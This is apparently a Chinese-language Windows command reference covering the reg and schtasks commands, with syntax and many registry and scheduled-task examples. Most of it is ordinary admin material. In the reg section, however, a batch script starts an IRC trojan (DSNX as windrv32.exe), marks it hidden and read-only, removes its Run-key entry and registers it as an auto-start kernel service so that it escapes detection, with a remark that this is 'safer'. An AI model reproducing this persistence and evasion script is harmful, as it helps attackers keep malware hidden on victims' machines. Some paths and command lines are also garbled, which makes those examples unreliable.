reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE" /ve /d "%ProgramFiles%\Internet Explorer\IEXPLORE.EXE" /t REG_SZ /f (UC房间打不开广播)

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\MSCONFIG.EXE" /ve /d "%SystemRoot%\PCHealth\HelpCtr\Binaries\MSConfig.exe" /t REG_SZ /f  (运行MSConfig提示找不到文件)

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\wmplayer.exe" /ve /d "%ProgramFiles%\Windows Media Player\wmplayer.exe" /t REG_SZ /f  (不能正常调用WMP播放器的修复)

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WORDPAD.EXE" /ve /d "%ProgramFiles%\Windows NT\Accessories\WORDPAD.EXE" /t REG_SZ /f  不能正常调用写字板的修复)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ctfmon.exe /t REG_SZ /d "%SystemRoot%\system32\ctfmon.exe" /f(开机启动输入法程序CTFMON)

reg add "HKCU\ControlPanel\Desktop" /v WaitToKIllAppTimeOut /t REG_SZ /d 10000 /f(加速关闭应用程序)

【 reg delete 】
从注册表删除项或子项,返回值:0成功,1失败
语法:reg delete KeyName [{/v EntryName|/ve|/va}] [/f]

参数
KeyName
指定子项的完全路径。对于远程计算机,请在\\ComputerName\PathToSubkey中的子项路径前包含计算机名称。忽略ComputerName会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为HKLM、HKCU、HKCR、HKU以及HKCC。

/v EntryName : 删除子项下的特定项。如果未指定项则将删除子项下的所有项和子项。
/ve : 指定只可以删除为空值的项。
/va : 删除指定子项下的所有项,使用本参数不能删除指定子项下的子项。
/f : 无需请求确认而删除现有的注册表子项或项。
/? : 在命令提示符显示帮助。

reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /f(任务栏里的任务管理器为灰色)

reg delete "HKLM\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg" /f(删除MSConfig启动里的未勾选项目)

reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ctfmon.exe" /f(删除CTFMON的镜像劫持)

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify" /v IconStreams /f

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify" /v PastIconsStream /f(删除通知区域的历史记录)

【 reg compare 】
比较指定的注册表子项或项,返回值:0比较成功且结果相同,1比较失败,2比较成功并找到不同点
语法:reg compare KeyName1 KeyName2 [/v EntryName | /ve] {[/oa]|[/od]|[/os]|[on]} [/s]

KeyName
指定子项的完全路径。对于远程计算机,请在\\ComputerName\PathToSubkey中的子项路径前包含计算机名称。忽略ComputerName会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为HKLM、HKCU、HKCR、HKU以及HKCC。如果指定远程计算机,则只可使用HKLM和HKU子目录树。

/v EntryName : 比较子项下的特定项。
/ve : 指定只可以比较没有值的项。
{[/oa]|[/od]|[/os]|[on]} : 指定不同点和匹配点的显示方式。默认设置是/od。值说明
/oa指定显示所有不同点和匹配点。默认情况下,仅列出不同点。
/od指定仅显示不同点。这是默认操作。
/os指定仅显示匹配点。默认情况下,仅列出不同点。
/on指定不显示任何内容。默认情况下,仅列出不同点。
/s Separator : 比较所有子项和项。
/? : 在命令提示符显示帮助。

reg compare "hkcu\software\microsoft\winmine" "hkcu\software\microsoft\winmine" /od /s

【 reg copy 】
将一个注册表项复制到本地或远程计算机的指定位置,返回值:0成功,1失败
语法:reg copy KeyName1 KeyName2 [/s] [/f]

KeyName1
指定要复制子项的完整路径。对于远程计算机,请在\\ComputerName\PathToSubkey中的子项路径前包含计算机名称。忽略ComputerName会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为HKLM、HKCU、HKCR、HKU以及HKCC。如果指定远程计算机,则只可使用HKLM和HKU子目录树。

KeyName2
指定子项目的地的完整路径。对于远程计算机,请在\\ComputerName\PathToSubkey中的子项路径前包含计算机名称。忽略ComputerName会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为HKLM、HKCU、HKCR、HKU以及HKCC。如果指定远程计算机,则只可使用HKLM和HKU子目录树。

/s : 复制指定子项下的所有子项和项。
/f : 无需请求确认而直接复制子项。
/? : 在命令提示符显示帮助。

reg copy "hkcu\software\microsoft\winmine" "hkcu\software\microsoft\winminebk" /s /f
reg copy "hkcu\software\microsoft\winminebk" "hkcu\software\microsoft\winmine" /s

【 reg export 】
将指定子项、项和值的副本创建到文件中,以便将其传输到其它服务器,返回值:0成功,1失败,Export操作仅可在本地计算机上工作
语法:reg export KeyName FileName

KeyName : 指定子项的完全路径,以相应的子目录树开始路径,有效子目录树为HKLM、HKCU、HKCR、HKU以及HKCC
FileName : 指定要导出文件的名称和路径。该文件必须具有.reg扩展名。
/? : 在命令提示符显示帮助。

reg export "hkcu\software\microsoft\winmine" c:\data\regbackups\wmbkup.reg

【 reg import 】
将包含导出的注册表子项、项和值的文件复制到本地计算机的注册表中,返回值:0成功,1失败
语法:reg import FileName

FileName : 指定将复制到本地计算机注册表中的文件的名称和路径。必须预先使用reg export命令创建该文件。
/? : 在命令提示符显示帮助。

reg import hkcu\software\microsoft\winmine" c:\data\regbackups\wmbkup.reg

【 reg load 】
将保存的子项和项写回到注册表的不同子项中,其目的是保存到一个临时文件中,而该文件可用于注册表项的疑难解答或编辑注册表项。
语法:reg load KeyName FileName

KeyName指定子项的完全路径。对于远程计算机,请在\\ComputerName\PathToSubkey中的子项路径前包含计算机名称。忽略ComputerName会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为HKLM

【 reg restore 】
将保存的子项和项写回到注册表,该操作用于覆盖已编辑的注册表项。编辑注册表项之前请使用reg save操作保存父亲子项。如果编辑失败则可以使用本操作恢复子项
返回值:0 成功,1 失败
语法:reg restore KeyName FileName

KeyName指定子项的完全路径。Restore 操作仅在本地计算机上工作。以相应的子目录树开始路径。有效子目录树为 HKLM、HKCU、HKCR、HKU 以及 HKCC。
FileName指定将写回到注册表中的文件的名称和路径。必须使用带 .hiv 扩展名的 reg save 操作预先创建该文件。
/?在命令提示符显示帮助。

reg restore "hkcu\software\microsoft\winmine" wmbkup.hiv

【 reg save 】
将指定的子项、项和注册表值的副本保存到指定文件中。返回值:0 成功,1 失败
语法： reg save KeyName FileName

KeyName指定子项的完全路径。对于远程计算机,请在 \\ComputerName\PathToSubkey 中的子项路径前包含计算机名称。忽略 ComputerName 会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为 HKLM、HKCU、HKCR、HKU 以及 HKCC。
FileName指定所创建的文件的名称和路径。如果未指定路径,则使用当前路径。
/?在命令提示符显示帮助。

reg save "hkcu\software\microsoft\winmine" wmbkup.hiv

【 reg unload 】
使用 reg load 操作删除已加载的部分注册表,返回值:0 成功,1 失败
语法:reg unload KeyName

KeyName指定子项的完全路径。对于远程计算机,请在 \\ComputerName\PathToSubkey 中的子项路径前包含计算机名称。忽略 ComputerName 会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为 HKLM、HKCU、HKCR、HKU 以及 HKCC。
/? 在命令提示符显示帮助。

reg unload "hkcu\software\microsoft\winminebk2"

【 批处理生成.Reg文件操作注册表 】
用批处理中的重定向符号可以轻松地生成.reg文件,然后用命令执行.reg文件即可

.reg文件执行方法
1)直接执行reg文件
2)regedit /s *.reg (/s不用确认)
3)reg import *.reg

.reg文件首行必须是:Windows Registry Editor Version 5.00,然后才是操作注册表的内容,和从注册表中导出的文件格式一致

1、创建子项: 在HKEY_LOCAL_MACHINE\SOFTWARE\下创建了一个名为“TTT”的子项
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SOFTWARE\TTT]

2、创建一个项目名称,在[HKEY_LOCAL_MACHINE\SOFTWARE\TTT]下新建:Name、EMail、 URL、Type四个项目,Name、Email、URL的类型是“String Value”,Type的类型是“DWORD Value”
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SOFTWARE\TTT]
"Name"="TTT BLOG"
"EMail"="taoether@gmail.com"
"URL"="http://www.taoyoyo.net/ttt/"
"Type"=dword:02

3、修改键值
修改相对来说比较简单,只要把需要修改的项目导出,然后用记事本进行修改,然后导入(regedit /s)即可,就象新建一样即可,可以一次修改同一子项下的多个项目。

4、删除项目名称:执行以下脚本,"EMail"就被删除了
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SOFTWARE\TTT]
"EMail"=-

5、删除子项:执行以下脚本子项ttt和ddd就已经被删除了
Windows Registry Editor Version 5.00
[-HKEY_LOCAL_MACHINE\SOFTWARE\TTT]
[-HKEY_LOCAL_MACHINE\SOFTWARE\DDD]

6、也可以用bat文件代替reg文件
@echo off
echo Windows Registry Editor Version 5.00 >t1.reg
echo.
echo [HKEY_LOCAL_MACHINE\SOFTWARE\TTT] >>t1.reg
echo "Name"="TTT BLOG" >>t1.reg
echo "EMail"="taoether@gmail.com" >>t1.reg
echo "URL"="http://www.taoyoyo.net/ttt/" >>t1.reg
echo "Type"=dword:02 >>t1.reg
regedit /s t1.reg
del /q t1.reg
pause

在使用一些比较老的木马时,可能会在注册表的[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows\CurrentVersion\Run(Runonce、Runservices、Runexec)]下生成一个键值用来实现木马的自启动,但这样很容易暴露木马程序的路径,从而导致木马被查杀,相对地若是将木马程序注册为系统服务则相对安全一些,下面以配置好地IRC木马DSNX为例 (名为windrv32.exe)
@start windrv32.exe
@attrib +h +r windrv32.exe
@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >>patch.dll
@echo "windsnx "=- >>patch.dll
@sc.exe create Windriversrv type= kernel start= auto displayname= WindowsDriver binpath= c:\winnt\system32\windrv32.exe
@regedit /s patch.dll
@delete patch.dll
@REM [删除DSNXDE在注册表中的启动项,用sc.exe将之注册为系统关键性服务的同时将其属性设为隐藏和只读,并config为自启动]
@REM 这样不是更安全^_^.

</pre>

<h4>schtasks命令 任务计划</h4><pre>
schtasks命令安排命令和程序,使其定期运行或在指定时间运行。向计划中添加任务和从中删除任务、根据需要启动和停止任务以及显示和更改计划的任务。

SchTasks.exe取代了包含在Windows早期版本中的工具At.exe。XP、Vista、Windows7、Windows2003/2008等系统中均可以使用
SchTasks.exe执行的操作类似于“控制面板”中“计划任务”中的操作。可以使用两种工具中的任一种来创建、删除、配置或显示计划任务。
用户必须是命令起作用的计算机上的Administrators组(管理员)的成员
要确认计划运行或要找出计划不运行的原因,请查看“任务计划”服务事务日志SystemrootSchedLgU.txt。该日志记录了由包括“计划任务”和SchTasks.exe在内的所有使用该服务的工具启动的尝试运行
损坏任务文件的情况极少发生。已损坏文件不会运行。在已损坏任务上试图执行某项操作时,SchTasks.exe显示以下错误消息:
错误:数据非法。
已损坏任务无法恢复。要恢复系统的计划任务特征,请使用 SchTasks.exe 或“计划任务”从系统中删除任务并重新计划。

schtasks命令一般会被一些软件使用来执行初始化安装或者卸载的时候使用,例如有些软件卸载后会提示您必须重启后才能彻底卸载之类的,就可能涉及到用这个命令来在关机时或者下次开机时执行一次性的计划任务。

键入不带任何参数的schtasks执行查询

>schtasks /?
SCHTASKS /parameter [arguments]
描述: 允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务。

参数列表:
/Create         创建新计划任务。
/Delete         删除计划任务。
/Query          显示所有计划任务。
/Change         更改计划任务属性。
/Run            按需运行计划任务。
/End            中止当前正在运行的计划任务。
/ShowSid        显示与计划的任务名称相应的安全标识符。
/?              显示此帮助消息。

Examples:
SCHTASKS
SCHTASKS /?
SCHTASKS /Run /?
SCHTASKS /End /?
SCHTASKS /Create /?
SCHTASKS /Delete /?
SCHTASKS /Query  /?
SCHTASKS /Change /?
SCHTASKS /ShowSid /?

【 schtasks create 创建新的计划任务 】
schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | "System"} [/rpPassword]] /?

参数
/tn TaskName
指定任务的名称。

/tr TaskRun
指定任务运行的程序或命令。键入可执行文件、脚本文件或批处理文件的完全合格的路径和文件名,如果忽略该路径SchTasks.exe将假定文件在SystemrootSystem32目录下

/sc schedule
指定计划类型,有效值为MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。
MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY指定计划的时间单位。
ONCE任务在指定的日期和时间运行一次。
ONSTART任务在每次系统启动的时候运行,可以指定启动的日期或下一次系统启动的时候运行任务。
ONLOGON每当用户(任意用户)登录的时候任务就运行,可以指定日期或在下次用户登录的时候运行任务。
ONIDLE只要系统空闲了指定的时间任务就运行,可以指定日期或在下次系统空闲的时候运行任务。

/mo modifier
指定任务在其计划类型内的运行频率,这个参数对于MONTHLY计划是必需的,对于MINUTE、HOURLY、DAILY或WEEKLY计划这个参数有效,但也可选, 默认值为1。
计划类型
修饰符
说明
MINUTE(1～1439)任务每n分钟运行一次。
HOURLY(1～23)任务每n小时运行一次。
DAILY(1～365)任务每n天运行一次。
WEEKLY(1～52)任务每n周运行一次。
MONTHLY(1～12)任务每n月运行一次。
LASTDAY任务在月份的最后一天运行。
FIRST、SECOND、THIRD、FOURTH、LAST与/d day参数共同使用,并在特定的周和天运行任务,例如在月份的第三个周三

/d dirlist
指定周或月的一天,只与WEEKLY或MONTHLY计划共同使用时有效。
计划类型日期值
WEEKLY可选项,有效值是MON ~ SUN和*(每一天),默认MON
MONTHLY在使用FIRST、SECOND、THIRD、FOURTH或LAST修饰符(/mo)时,需要MON～SUN中的某个值。1～31是可选的,只在没有修饰符或修饰符为1～12类型时有效,默认1即月份的第一天

/m month[,month...]
指定一年中的一个月,有效值是JAN～DEC和*(每个月),/m参数只对于MONTHLY计划有效。在使用LASTDAY修饰符时这个参数是必需的,否则它是可选的,默认值是*(每个月)。

/i InitialPageFileSize
指定任务启动之前计算机空闲多少分钟。键入一个1～999之间的整数。这个参数只对于ONIDLE计划有效,而且是必需的。

/st StartTime
以HH:MM:SS 24小时格式指定时间,默认值是命令完成时的当前本地时间。/st参数只对于MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY和ONCE计划有效。它只对于ONCE计划是必需的。

/sd StartDate
以MM/DD/YYYY格式指定任务启动的日期。默认值是当前日期。/sd参数对于所有的计划有效,但只对于ONCE计划是必需的。

/ed EndDate
指定任务计划运行的最后日期。此参数是可选的。它对于ONCE、ONSTART、ONLOGON或ONIDLE计划无效。默认计划没有结束日期。

/s Computer
指定远程计算机的名称或IP地址(带有或没有反斜杠)。默认值是本地计算机。

/u [domain]user
使用特定用户帐户的权限运行命令。默认使用已登录到运行SchTasks的计算机上的用户的权限运行命令。

/p password
指定在 /u 参数中指定的用户帐户的密码,如果使用/u参数则需要该参数。

/ru {[Domain]User | "System"}
使用指定用户帐户的权限运行任务,默认使用用户登录到运行SchTasks的计算机上的权限运行任务。
值说明
[domain}User?指定用户帐户。
"System"或""指定操作系统使用的NT AuthoritySystem帐户。

/rp Password
指定用户帐户的密码,该用户帐户在 /u 参数中指定。如果在指定用户帐户的时候忽略了这个参数,SchTasks.exe会提示输入密码而且不显示键入的文本。使用NT AuthoritySystem 帐户权限运行的任务不需要密码,SchTasks.exe也不会提示索要密码。/?在命令提示符显示帮助。

注释
XOX SchTasks.exe 不验证程序文件的位置或用户帐户密码。如果没有为用户帐户输入正确的文件位置或正确的密码,任务仍然可以创建,但不会运行。如果帐户的密码更改或过期,而且没有更改存储在任务中的密码,那么任务也不会运行。 NT AuthoritySystem 帐户没有交互式登录权限。用户看不到以系统权限运行的程序,不能与之交互。 每个任务只运行一个程序,但可以创建一个批处理文件来启动多个任务,然后计划一个任务来运行该批处理文件。 只要创建了任务就可对其测试。使用run操作来测试任务,然后从SchedLgU.txt文件(SystemrootSchedLgU.txt)中查阅错误。

>schtasks /create /?

SCHTASKS /Create [/S system [/U username [/P [password]]]]
    [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day]
    [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime]
    [/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]]
    [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F] [/HRESULT] [/?]

描述:
允许管理员在本地或远程系统上创建计划任务。

参数列表:
/S   system        指定要连接到的远程系统。如果省略这个系统参数,默认是本地系统。
/U   username      指定应在其中执行 SchTasks.exe 的用户上下文。
/P   [password]    指定给定用户上下文的密码。如果省略则提示输入。
/RU  username      指定任务在其下运行的“运行方式”用户帐户(用户上下文)。
                   对于系统帐户有效值是""、"NT AUTHORITY\SYSTEM"或"SYSTEM"。
                   对于v2任务,"NT AUTHORITY\LOCALSERVICE"和"NT AUTHORITY\NETWORKSERVICE"以及常见的SID对这三个也都可用。
/RP  [password]    指定“运行方式”用户的密码。要提示输入密码,值必须是"*"或无。系统帐户会忽略该密码。
                   必须和/RU或/XML开关一起使用。
/RU/XML    /SC   schedule     指定计划频率。
                   有效计划任务:  MINUTE、 HOURLY、DAILY、WEEKLY、MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.
/MO   modifier     改进计划类型以允许更好地控制计划重复周期。有效值列于下面“修改者”部分中。
/D    days         指定该周内运行任务的日期。
                   有效值:MON、TUE、WED、THU、FRI、SAT、SUN和对MONTHLY计划的1-31(某月中的日期)。通配符“*”指定所有日期。
/M    months       指定一年内的某月,默认该月第一天。
                   有效值: JAN、FEB、MAR、APR、MAY、JUN、JUL、AUG、SEP、OCT、NOV和DEC。通配符“*”指定所有的月。
/I    idletime     指定运行一个已计划的 ONIDLE 任务之前要等待的空闲时间。有效值范围: 1 到 999 分钟。
/TN   taskname     以路径\名称形式指定对此计划任务进行唯一标识的字符串。
/TR   taskrun      指定在这个计划时间运行的程序的路径和文件名。例如: C:\windows\system32\calc.exe
/ST   starttime    指定运行任务的开始时间。
                   格式为HH:mm (24小时时间),例如14:30表示2:30 PM。如果未指定/ST则默认值为当前时间。/SC ONCE必需有此选项。
/RI   interval     用分钟指定重复间隔。这不适用于计划类型: MINUTE、HOURLY、ONSTART,ONLOGON, ONIDLE, ONEVENT
                   有效范围: 1 - 599940 分钟。如果已指定 /ET 或 /DU,则其默认值为10 分钟。
/ET   endtime      指定运行任务的结束时间。
                   格式为HH:mm (24 小时时间),例如,14:50 表示 2:50 PM。
                   这不适用于计划类型: ONSTART、ONLOGON, ONIDLE, ONEVENT.
/DU   duration     指定运行任务的持续时间。
                   时间格式为 HH:mm。这不适用于 /ET 和计划类型: ONSTART, ONLOGON, ONIDLE, ONEVENT.
                   对于 /V1 任务,如果已指定 /RI,则持续时间默认值为1 小时。
/K                 在结束时间或持续时间终止任务。必须指定/ET或/DU。
                   这不适用于计划类型:ONSTART、ONLOGON, ONIDLE,ONEVENT
/SD   startdate    指定运行任务的第一个日期。
                   格式为 yyyy/mm/dd。默认值为当前日期。这不适用于计划类型: ONCE、ONSTART, ONLOGON, ONIDLE, ONEVENT.
/ED   enddate      指定此任务运行的最后一天的日期。
                   格式是 yyyy/mm/dd。这不适用于计划类型:ONCE、ONSTART、ONLOGON、ONIDLE。
/EC   ChannelName  为 OnEvent 触发器指定事件通道。
/IT                仅有在/RU用户当前已登录且作业正在运行时才可以交互式运行任务。此任务只有在用户已登录的情况下才运行。
/NP                不储存任何密码。任务以给定用户的身份非交互的方式运行。只有本地资源可用。
/Z                 标记在最终运行完任务后删除任务。
/XML  xmlfile      从文件的指定任务XML中创建任务。可以组合使用/RU和/RP开关,或者在任务XML已包含主体时单独使用/RP。
/V1                创建 Vista 以前的平台可以看见的任务,不兼容/XML。
/F                 如果指定的任务已经存在,则强制创建任务并抑制警告。
/RL   level        为作业设置运行级别。有效值为LIMITED和HIGHEST,默认LIMITED。
/DELAY delaytime   指定触发触发器后延迟任务运行的等待时间,格式为mmmm:ss。此选项仅对计划类型ONSTART, ONLOGON, ONEVENT.
/HRESULT           为获得更出色的故障诊断能力,处理退出代码将采用 HRESULT 格式。
/?                 显示此帮助消息。

修改者: 按计划类型的 /MO 开关的有效值:
MINUTE:  1 到 1439 分钟。
HOURLY:  1 - 23 小时。
DAILY:   1 到 365 天。
WEEKLY:  1 到 52 周。
ONCE:    无修改者。
ONSTART: 无修改者。
ONLOGON: 无修改者。
ONIDLE:  无修改者。
MONTHLY: 1 到 12,或FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。
ONEVENT:  XPath事件查询字符串。

示例:
创建计划任务"testminute",每分钟执行cmd脚本
SCHTASKS /Create /SC MINUTE /MO 1 /TN testminute /TR C:\Users\lenovo\Desktop\test.cmd
type test.cmd: date >> a.txt
每次自动执行bat脚本时弹窗
解决:打开任务计划窗口,找到任务右键属性,更改用户和组,高级,查找位置选择system
解决:打开任务计划窗口,找到任务右键属性,选择隐藏

在远程机器 "ABC" 上创建计划任务 "doc",该机器每小时在 "runasuser" 用户下运行 notepad.exe。
SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword
         /SC HOURLY /TN doc /TR notepad

在远程机器"ABC上创建计划任务"accountant",在指定的开始日期和结束日期之间的开始时间和结束时间内,每隔五分钟运行calc.exe。
SCHTASKS /Create /S ABC /U domain\user /P password
         /SC MINUTE /MO 5 /TN accountant /TR calc.exe /ST 12:00 /ET 14:00
         /SD 06/06/2006 /ED 06/06/2006 /RU runasuser /RP userpassword

创建计划任务 "gametime",在每月的第一个星期天运行“空当接龙”。
SCHTASKS /Create /SC MONTHLY /MO first /D SUN /TN gametime /TR c:\windows\system32\freecell

在远程机器 "ABC" 创建计划任务 "report",每个星期运行 notepad.exe。
SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword
         /SC WEEKLY /TN report /TR notepad.exe

在远程机器"ABC"创建计划任务"logtracker",每隔五分钟从指定的开始时间到无结束时间,运行notepad.exe。将提示输入/RP密码。
SCHTASKS /Create /S ABC /U domain\user /P password
         /SC MINUTE /MO 5 /TN logtracker /TR c:\windows\system32\notepad.exe /ST 18:30 /RU runasuser /RP

创建计划任务 "gaming",每天从 12:00 点开始到 14:00 点自动结束,运行 freecell.exe。
SCHTASKS /Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00 /ET 14:00 /K

创建计划任务“EventLog”以开始运行 wevtvwr.msc 只要在“系统”通道中发布事件101
SCHTASKS /Create /TN EventLog /TR wevtvwr.msc /SC ONEVENT /EC System /MO *[System/EventID=101]

文件路径中可以加入空格,但需要加上两组引号,一组引号用于CMD.EXE,另一组用于SchTasks.exe。
用于CMD的外部引号必须是一对双引号;内部引号可以是一对单引号或一对转义双引号:
SCHTASKS /Create /tr "'c:\program files\internet explorer\iexplorer.exe' \"c:\log data\today.xml\"" .

【 每个计划类型的语法和范例 】
1、schtasks create minute
schtasks /create /tn TaskName /tr TaskRun /sc minute [/mo {1 - 1439}] [/stStartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain]user /p password]] [/ru {[Domain]User | "System"} [/rp Password]]

计划任务每20分钟运行一次
下面的命令计划安全脚本Sec.vbs每20分钟运行一次。由于命令没有包含起始日期或时间,任务在命令完成20分钟后启动,此后每当系统运行它就每20分钟运行一次。安全脚本源文件位于远程计算机上,但任务在本地计算机上计划并执行。
schtasks /create /sc minute /mo 20 /tn "Security Script" /tr centraldatascriptssec.vbs
作为响应,SchTasks.exe显示一条消息说明任务会以当前用户的权限运行并需要当前用户的密码,SchTasks.exe不显示键入的密码文本
 The task will be created under current logged-in user name.
Please enter the password
************
然后SchTasks.exe显示一条消息表明已计划该任务:
成功:计划任务 "Security Script" 已成功创建。
查询显示命令计划的任务:
 TaskName                  Next Run Time            Status
========================= ======================== ==============
Security Script           10:50:00 AM , 4/4/2001

2、schtasks create hourly
schtasks /create /tn TaskName /tr TaskRun /sc hourly [/mo {1 - 365}] [/stStartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain]user /ppassword]] [/ru {[Domain]User | "System"} [/rp Password]]

计划命令在每小时过五分的时候运行。
下面的命令将计划 MyApp 程序从午夜过后五分钟起每小时运行一次。因为忽略了 /mo 参数,命令使用了小时计划的默认值,即每 (1) 小时。如果该命令在 12:05 A.M 之后生成,程序将在第二天才会运行。
schtasks /create /sc hourly /st 00:05:00 /tn "My App" /tr c:appsmyapp.exe

计划命令每五小时运行一次
下面的命令计划 MyApp 程序从 2001 年 3 月的第一天起每五小时运行一次。它使用 /mo参数来指定间隔时间,使用 /sd 参数来指定起始日期。由于命令没有指定起始时间,当前时间被用作起始时间。
schtasks /create /sc hourly /mo 5 /sd 03/01/2001 /tn "My App" /tr c:appsmyapp.exe

3、schtasks create daily
schtasks /create /tn TaskName /tr TaskRun /sc daily [/mo {1 - 365}] [/stStartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain]user /ppassword]] [/ru {[Domain]User | "System"} [/rp Password]]

计划任务每天运行一次
下面的范例计划 MyApp 程序在每天的 8:00 A.M. 运行一次,直到 2001 年 12 月 31 日结束。由于它忽略了 /mo 参数,所以使用默认间隔 1 来每天运行命令。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc daily /st 08:00:00 /ed 12/31/2001

计划任务每隔一天运行一次
下面的范例计划 MyApp 程序从 2001 年 12 月 31 日起每隔一天在 1:00 P.M. (13:00) 运行。命令使用 /mo 参数来指定两 (2) 天的间隔。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc daily /mo 2 /st 13:00:00 /sd 12/31/2001

4、schtasks create weekly
schtasks /create /tn TaskName /tr TaskRun /sc weekly [/d {MON - SUN | *}] [/mo{1 - 52}] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u[domain]user /p password]] [/ru {[Domain]User | "System"} [/rp Password]]

计划任务每六周运行一次
下面的命令计划 MyApp 程序在远程计算机上每六周运行一次。该命令使用 /mo 参数来指定间隔。它也使用 /s 参数来指定远程计算机,使用 /ru 参数来计划任务以用户的 Administrator 帐户权限运行。因为忽略了 /rp 参数,SchTasks.exe 会提示用户输入 Administrator 帐户密码。
另外,因为命令是远程运行的,所以命令中所有的路径,包括到 MyApp.exe 的路径,都是指向远程计算机上的路径。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc weekly /mo 6 /s Server16 /ru Admin01

计划任务每隔一周在周五运行
下面的命令计划任务每隔一周在周五运行。它使用 /mo 参数来指定两周的间隔,使用 /d参数来指定是一周内的哪一天。如计划任务在每个周五运行,要忽略 /mo 参数或将其设置为 1。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc weekly /mo 2 /d FRI

5、schtasks create monthly

常规月计划语法 schtasks /create /tn TaskName /tr TaskRun /sc monthly [/mo{FIRST | SECOND | THIRD | FOURTH | LAST | LASTDAY] [/d {MON - SUN | 1 - 31}] [/m {JAN - DEC[,JAN - DEC...] | *}] [/st StartTime] [/sd StartDate] [/ed EndDate] [/scomputer [/u [domain]user /p password]] [/ru {[Domain]User | "System"} [/rpPassword]]

指定周的语法 schtasks /create /tn TaskName /tr TaskRun /sc monthly /mo {FIRST| SECOND | THIRD | FOURTH | LAST} /d {MON - SUN} [/m {JAN - DEC[,JAN -DEC...] | *}] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u[domain]user /p password]] [/ru {[Domain]User | "System"} [/rp Password]] Lastday

语法 schtasks /create /tn TaskName /tr TaskRun /sc monthly /mo LASTDAY /m {JAN - DEC[,JAN - DEC...] | *} [/st StartTime] [/sd StartDate] [/edEndDate] [/s computer [/u [domain]user /p password]] [/ru {[Domain]User |"System"} [/rp Password]]

指定日期的语法 schtasks /create /tn TaskName /tr TaskRun /sc monthly /d {1 -31} [/m {JAN - DEC[,JAN - DEC...] | *}] [/st StartTime] [/sd StartDate] [/edEndDate] [/s computer [/u [domain]user /p password]] [/ru {[Domain]User |"System"} [/rp Password]]

计划任务在每月的第一天运行
下面的命令计划 MyApp 程序在每月的第一天运行。因为默认修饰符是 none(即:没有修饰符),默认天是第一天,默认的月份是每个月,所以该命令不需要任何其它的参数。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc monthly

计划任务在每月的最后一天运行
下面的命令计划 MyApp 程序在每月的最后一天运行。它使用 /mo 参数指定在每月的最后一天运行程序,使用通配符 (*) 与 /m 参数表明在每月的最后一天运行程序。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc monthly /mo lastday /m *

计划任务每三个月运行一次
下面的命令计划 MyApp 程序每三个月运行一次。.它使用 /mo 参数来指定间隔。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc monthly /mo 3

计划任务在每月的第二个周日运行
下面的命令计划 MyApp 程序在每月的第二个周日运行。它使用 /mo 参数指定是每月的第二周,使用 /d 参数指定天。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc monthly /mo SECOND /d SUN

计划任务在五月和六月的第 15 天运行。
下面的命令计划 MyApp 程序在五月 15 日和六月 15 日的 3:00 PM (15:00) 运行。它使用/d 参数来指定日期,使用 /m 参数指定月份。它也使用 /st 参数来指定开始时间。
schtasks /create /tn "My App" /tr c:appsmyapp.exe /sc monthly /d 15 /m MAY,JUN /st 15:00:00

6、schtasks create once
schtasks /create /tn TaskName /tr TaskRun /sc once /st StartTime /sd StartDate[/s computer [/u [domain]user /p password]] [/ru {[Domain]User | "System"} [/rpPassword]]

计划任务运行一次
